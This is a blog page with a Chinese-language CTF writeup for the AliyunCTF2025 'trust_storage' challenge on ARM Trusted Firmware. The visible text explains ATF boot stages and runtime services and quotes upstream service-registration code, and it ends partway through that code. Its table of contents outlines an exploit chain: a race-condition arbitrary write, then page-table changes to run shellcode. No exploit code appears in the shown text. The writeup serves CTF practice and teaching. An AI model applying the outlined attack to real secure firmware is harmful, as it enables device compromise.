<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>AliyunCTF2025 - trust_storage writeup | Hotaru&#39;s Blog</title>
<meta name="keywords" content="ctf, pwn, ATF, aliyunctf2025, wp">
<meta name="description" content="Desc Text.">
<meta name="author" content="Hotaru">
<link rel="canonical" href="http://localhost:1313/ctfs/aliyunctf2025-trust_storage-wp/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.cacd151301eaa62b9ce5f55a04982cc489dbb04b1e85b871865043a50fd1573b.css" integrity="sha256-ys0VEwHqpiuc5fVaBJgsxInbsEsehbhxhlBDpQ/RVzs=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/ctfs/aliyunctf2025-trust_storage-wp/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top"><script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
<script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Hotaru&#39;s Blog (Alt + H)">Hotaru&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/ctfs/">Ctfs</a></div>
    <h1 class="post-title entry-hint-parent">
      AliyunCTF2025 - trust_storage writeup
    </h1>
    <div class="post-description">
      Desc Text.
    </div>
    <div class="post-meta"><span title='2025-03-25 14:55:47.6070799 +0800 CST'>2025-03-25</span>&nbsp;·&nbsp;32 min&nbsp;·&nbsp;6652 words&nbsp;·&nbsp;Hotaru

</div>
  </header> 
<figure class="entry-cover">
            <img loading="eager" src="http://localhost:1313/images/msg.png" alt="">
        
</figure><div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#%e9%a2%98%e7%9b%ae%e5%88%86%e6%9e%90" aria-label="题目分析">题目分析</a><ul>
                        
                <li>
                    <a href="#atf%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" aria-label="ATF基础知识">ATF基础知识</a><ul>
                        
                <li>
                    <a href="#%e6%ba%90%e7%a0%81%e7%bb%93%e6%9e%84" aria-label="源码结构">源码结构</a></li>
                <li>
                    <a href="#runtime-service" aria-label="runtime service">runtime service</a></li>
                <li>
                    <a href="#%e6%89%a7%e8%a1%8c%e7%8e%af%e5%a2%83" aria-label="执行环境">执行环境</a></li>
                <li>
                    <a href="#smc-calls" aria-label="smc calls">smc calls</a></li></ul>
                </li>
                <li>
                    <a href="#%e8%a7%a3%e5%8c%85" aria-label="解包">解包</a></li>
                <li>
                    <a href="#%e9%80%86%e5%90%91%e5%88%86%e6%9e%90" aria-label="逆向分析">逆向分析</a><ul>
                        
                <li>
                    <a href="#%e6%81%a2%e5%a4%8d%e7%ac%a6%e5%8f%b7" aria-label="恢复符号">恢复符号</a></li>
                <li>
                    <a href="#rt_svc_desc_t" aria-label="rt_svc_desc_t">rt_svc_desc_t</a></li>
                <li>
                    <a href="#storage_svc" aria-label="STORAGE_SVC">STORAGE_SVC</a></li>
                <li>
                    <a href="#log_svc" aria-label="LOG_SVC">LOG_SVC</a></li>
                <li>
                    <a href="#%e5%88%a4%e6%96%ad%e5%86%85%e5%ad%98%e5%9c%b0%e5%9d%80%e6%98%af%e5%90%a6%e5%ae%89%e5%85%a8" aria-label="判断内存地址是否安全">判断内存地址是否安全</a></li>
                <li>
                    <a href="#%e8%8e%b7%e5%8f%96%e5%86%85%e5%ad%98%e6%98%a0%e5%b0%84%e4%bf%a1%e6%81%af" aria-label="获取内存映射信息">获取内存映射信息</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#%e5%88%a9%e7%94%a8%e8%bf%87%e7%a8%8b" aria-label="利用过程">利用过程</a><ul>
                        
                <li>
                    <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af" aria-label="利用思路">利用思路</a></li>
                <li>
                    <a href="#%e8%b0%83%e8%af%95tips" aria-label="调试tips">调试tips</a></li>
                <li>
                    <a href="#step0-smc%e6%8c%87%e4%bb%a4%e8%b0%83%e7%94%a8%e6%96%b9%e6%b3%95" aria-label="Step0: smc指令调用方法">Step0: smc指令调用方法</a></li>
                <li>
                    <a href="#step1-%e7%ab%9e%e4%ba%89%e5%86%99plog%e5%ae%9e%e7%8e%b0%e4%bb%bb%e6%84%8f%e5%9c%b0%e5%9d%80%e5%86%99" aria-label="Step1: 竞争写pLog，实现任意地址写">Step1: 竞争写pLog，实现任意地址写</a></li>
                <li>
                    <a href="#step2-%e4%bf%ae%e6%94%b9%e9%a1%b5%e8%a1%a8%e6%89%a7%e8%a1%8cshellcode" aria-label="Step2: 修改页表，执行shellcode">Step2: 修改页表，执行shellcode</a></li></ul>
                </li>
                <li>
                    <a href="#%e5%ae%8c%e6%95%b4exp" aria-label="完整Exp">完整Exp</a><ul>
                        
                <li>
                    <a href="#driver" aria-label="Driver">Driver</a></li>
                <li>
                    <a href="#shellcode" aria-label="Shellcode">Shellcode</a></li>
                <li>
                    <a href="#exploit" aria-label="Exploit">Exploit</a></li></ul>
                </li>
                <li>
                    <a href="#reference" aria-label="Reference">Reference</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="题目分析">题目分析<a hidden class="anchor" aria-hidden="true" href="#题目分析">#</a></h1>
<h2 id="atf基础知识">ATF基础知识<a hidden class="anchor" aria-hidden="true" href="#atf基础知识">#</a></h2>
<p>参考：</p>
<ul>
<li><a href="https://github.com/ARM-software/arm-trusted-firmware.git">https://github.com/ARM-software/arm-trusted-firmware.git</a></li>
<li><a href="https://www.virtualopensystems.com/en/services/arm-trusted-firmware-extended-services/">https://www.virtualopensystems.com/en/services/arm-trusted-firmware-extended-services/</a></li>
<li><a href="https://hackmd.io/@BooleanII/linux2024-ARM_Trusted_Firmware#ARM-trusted-firmware">https://hackmd.io/@BooleanII/linux2024-ARM_Trusted_Firmware#ARM-trusted-firmware</a></li>
</ul>
<p>Trusted Firmware-A (TF-A) is a reference implementation of secure world software for <a href="https://developer.arm.com/architectures/cpu-architecture/a-profile">Arm A-Profile architectures</a> (Armv8-A and Armv7-A), including an Exception Level 3 (EL3) <a href="http://www.arm.com/products/processors/technologies/trustzone/tee-smc.php">Secure Monitor</a>. It provides a suitable starting point for productization of secure world boot and runtime firmware, in either the AArch32 or AArch64 execution states.</p>
<p>ATF 是一个基于 ARMv8 的开源框架，用于使用 TrustZone，并分别在安全世界和普通世界中启动安全负载和非受信任的固件（例如 U-Boot 等）。<strong>安全世界和普通世界之间的上下文切换仅能在名为 Secure Monitor 或 EL3 的异常层中实现</strong>。</p>
<p>ATF的功能有两个：</p>
<ol>
<li>boot</li>
<li>runtime firmware（在EL3的异常层，通过smc指令实现）</li>
</ol>
<p><img alt="ARM trusted firmware layer description and EL3 firmware extensions by Virtual Open Systems" loading="lazy" src="./img/trust_storage_wp/atf_layer_extensions.png"></p>
<h3 id="源码结构">源码结构<a hidden class="anchor" aria-hidden="true" href="#源码结构">#</a></h3>
<p>ATF 是 ARM 的可信固件，官方提供了 <a href="https://github.com/ARM-software/arm-trusted-firmware.git">TF-A</a> 固件源码，源码结构主要为以下几个部分：</p>
<p><img alt="image-20250304083444333" loading="lazy" src="./img/trust_storage_wp/image-20250304083444333.png"></p>
<p>通过<code>blx/blx_main.c</code>中<code>blx_main</code>函数上方注释可以大概得知其功能：</p>
<ol>
<li>BL1：仅在冷启动后由主 CPU 调用，完成 CPU 和部分设备的初始化，加载 BL2 镜像。我们不关心 TF-A 中的 BL1 部分代码。</li>
<li>BL2：BL2 中唯一需要做的就是加载后续镜像并将控制权交给下一个 BL。BL2 占用的内存将由 BL3x 阶段回收。BL2 完全在 S-EL1 中运行。我们不关心 BL2 部分代码。</li>
<li>BL2u：如果平台定义了 SCP_BL2U_BASE，加载 SCP_BL2U，执行平台设置，返回 EL3。我们不关心 BL2u 部分代码。</li>
<li>BL31：BL31 负责在将控制权交给引导加载程序或操作系统之前，<strong>为主 CPU 设置运行时服务。此功能调用<code>runtime_svc_init()</code>，该函数初始化所有已注册的运行时服务</strong>。运行时服务将为核心设置足够的上下文，以便切换到下一个异常级别。当此函数返回时，核心将通过 ERET 切换到预定的异常级别。</li>
<li>BL32：安全系统固件，比如 OP-TEE等。我们不关心 BL2 部分代码。</li>
</ol>
<p>整个启动流程调用关系和层级结构如下，主要关注 BL31 的部分：</p>
<p><img alt="img" loading="lazy" src="./img/trust_storage_wp/v2-9b2fdd80be0f044b482e590d7505dfb6_r.jpg"></p>
<h3 id="runtime-service">runtime service<a hidden class="anchor" aria-hidden="true" href="#runtime-service">#</a></h3>
<p>在BL31中，在<code>bl31\bl31_main.c: bl31_main()</code>调用<code>common\runtime_svc.c: runtime_svc_init()</code>注册运行时服务，并执行每个服务的初始化函数。</p>
<p>每个服务对应一个<code>rt_svc_desc_t</code>类型的结构体，所有服务存储在<code>__RT_SVC_DESCS_START__</code>结构体数组中，每个服务对应一个唯一的<code>oen</code>，<code>rt_svc_descs_indices</code>哈希表记录了<code>oen</code>与在<code>__RT_SVC_DESCS_START__</code>结构体数组中序号的映射关系：</p>
<ul>
<li><code>service = __RT_SVC_DESCS_START__[index]</code></li>
<li><code>oen = (service-&gt;call_type&lt;&lt;6)|(service-&gt;start_oen&amp;0x3f)</code>（高2bits标识调用类型，低6bits标识oen）</li>
<li><code>rt_svc_descs_indices[oen] = index</code></li>
</ul>
<p>定义服务的相关结构体如下：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Prototype for runtime service SMC handler function. x0 (SMC Function ID) to
</span></span></span><span class="line"><span class="cl"><span class="cm"> * x4 are as passed by the caller. Rest of the arguments to SMC and the context
</span></span></span><span class="line"><span class="cl"><span class="cm"> * can be accessed using the handle pointer. The cookie parameter is reserved
</span></span></span><span class="line"><span class="cl"><span class="cm"> * for future use
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">uintptr_t</span> <span class="p">(</span><span class="o">*</span><span class="kt">rt_svc_handle_t</span><span class="p">)(</span><span class="kt">uint32_t</span> <span class="n">smc_fid</span><span class="p">,</span> <span class="c1">// x0: smc fid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				  <span class="kt">u_register_t</span> <span class="n">x1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				  <span class="kt">u_register_t</span> <span class="n">x2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				  <span class="kt">u_register_t</span> <span class="n">x3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				  <span class="kt">u_register_t</span> <span class="n">x4</span><span class="p">,</span> <span class="c1">// x1-x4: params
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				  <span class="kt">void</span> <span class="o">*</span><span class="n">cookie</span><span class="p">,</span> <span class="c1">// Reserve
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				  <span class="kt">void</span> <span class="o">*</span><span class="n">handle</span><span class="p">,</span> <span class="c1">// Rest of the arguments to SMC and the context
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				  <span class="kt">u_register_t</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">rt_svc_desc</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">uint8_t</span> <span class="n">start_oen</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">uint8_t</span> <span class="n">end_oen</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">uint8_t</span> <span class="n">call_type</span><span class="p">;</span> <span class="c1">// fast/yield call
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span> <span class="c1">// 服务名称
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kt">rt_svc_init_t</span> <span class="n">init</span><span class="p">;</span> <span class="c1">// 初始化函数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kt">rt_svc_handle_t</span> <span class="n">handle</span><span class="p">;</span> <span class="c1">// 服务句柄
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="kt">rt_svc_desc_t</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Convenience macros to declare a service descriptor
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define DECLARE_RT_SVC(_name, _start, _end, _type, _setup, _smch)	\
</span></span></span><span class="line"><span class="cl"><span class="cp">	static const rt_svc_desc_t __svc_desc_ ## _name			\
</span></span></span><span class="line"><span class="cl"><span class="cp">		__section(&#34;.rt_svc_descs&#34;) __used = {			\
</span></span></span><span class="line"><span class="cl"><span class="cp">			.start_oen = (_start),				\
</span></span></span><span class="line"><span class="cl"><span class="cp">			.end_oen = (_end),				\
</span></span></span><span class="line"><span class="cl"><span class="cp">			.call_type = (_type),				\
</span></span></span><span class="line"><span class="cl"><span class="cp">			.name = #_name,					\
</span></span></span><span class="line"><span class="cl"><span class="cp">			.init = (_setup),				\
</span></span></span><span class="line"><span class="cl"><span class="cp">			.handle = (_smch)				\
</span></span></span><span class="line"><span class="cl"><span class="cp">		}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>服务注册过程如下：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/*******************************************************************************
</span></span></span><span class="line"><span class="cl"><span class="cm"> * This function calls the initialisation routine in the descriptor exported by
</span></span></span><span class="line"><span class="cl"><span class="cm"> * a runtime service. Once a descriptor has been validated, its start &amp; end
</span></span></span><span class="line"><span class="cl"><span class="cm"> * owning entity numbers and the call type are combined to form a unique oen.
</span></span></span><span class="line"><span class="cl"><span class="cm"> * The unique oen is used as an index into the &#39;rt_svc_descs_indices&#39; array.
</span></span></span><span class="line"><span class="cl"><span class="cm"> * The index of the runtime service descriptor is stored at this index.
</span></span></span><span class="line"><span class="cl"><span class="cm"> ******************************************************************************/</span>
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">__init</span> <span class="nf">runtime_svc_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">rc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">uint8_t</span> <span class="n">index</span><span class="p">,</span> <span class="n">start_idx</span><span class="p">,</span> <span class="n">end_idx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">rt_svc_desc_t</span> <span class="o">*</span><span class="n">rt_svc_descs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* Assert the number of descriptors detected are less than maximum indices */</span>
</span></span><span class="line"><span class="cl">	<span class="nf">assert</span><span class="p">((</span><span class="n">RT_SVC_DESCS_END</span> <span class="o">&gt;=</span> <span class="n">RT_SVC_DESCS_START</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">			<span class="p">(</span><span class="n">RT_SVC_DECS_NUM</span> <span class="o">&lt;</span> <span class="n">MAX_RT_SVCS</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* If no runtime services are implemented then simply bail out */</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">RT_SVC_DECS_NUM</span> <span class="o">==</span> <span class="mi">0U</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* Initialise internal variables to invalid state */</span>
</span></span><span class="line"><span class="cl">	<span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">memset</span><span class="p">(</span><span class="n">rt_svc_descs_indices</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rt_svc_descs_indices</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">rt_svc_descs</span> <span class="o">=</span> <span class="p">(</span><span class="kt">rt_svc_desc_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">RT_SVC_DESCS_START</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="n">index</span> <span class="o">=</span> <span class="mi">0U</span><span class="p">;</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="n">RT_SVC_DECS_NUM</span><span class="p">;</span> <span class="n">index</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kt">rt_svc_desc_t</span> <span class="o">*</span><span class="n">service</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rt_svc_descs</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * An invalid descriptor is an error condition since it is
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * difficult to predict the system behaviour in the absence
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * of this service.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="n">rc</span> <span class="o">=</span> <span class="nf">validate_rt_svc_desc</span><span class="p">(</span><span class="n">service</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">rc</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">ERROR</span><span class="p">(</span><span class="s">&#34;Invalid runtime service descriptor %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				<span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">service</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="nf">panic</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * The runtime service may have separate rt_svc_desc_t
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * for its fast smc and yielding smc. Since the service itself
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * need to be initialized only once, only one of them will have
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * an initialisation routine defined. Call the initialisation
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * routine for this runtime service, if it is defined.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">service</span><span class="o">-&gt;</span><span class="n">init</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="n">rc</span> <span class="o">=</span> <span class="n">service</span><span class="o">-&gt;</span><span class="nf">init</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">rc</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nf">ERROR</span><span class="p">(</span><span class="s">&#34;Error initializing runtime service %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">						<span class="n">service</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">				<span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * Fill the indices corresponding to the start and end
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * owning entity numbers with the index of the
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * descriptor which will handle the SMCs for this owning
</span></span></span><span class="line"><span class="cl"><span class="cm">		 * entity range.
</span></span></span><span class="line"><span class="cl"><span class="cm">		 */</span>
</span></span><span class="line"><span class="cl">		<span class="n">start_idx</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="nf">get_unique_oen</span><span class="p">(</span><span class="n">service</span><span class="o">-&gt;</span><span class="n">start_oen</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">						    <span class="n">service</span><span class="o">-&gt;</span><span class="n">call_type</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">end_idx</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="nf">get_unique_oen</span><span class="p">(</span><span class="n">service</span><span class="o">-&gt;</span><span class="n">end_oen</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">						  <span class="n">service</span><span class="o">-&gt;</span><span class="n">call_type</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">assert</span><span class="p">(</span><span class="n">start_idx</span> <span class="o">&lt;=</span> <span class="n">end_idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">assert</span><span class="p">(</span><span class="n">end_idx</span> <span class="o">&lt;</span> <span class="n">MAX_RT_SVCS</span><span class="p">);</span>
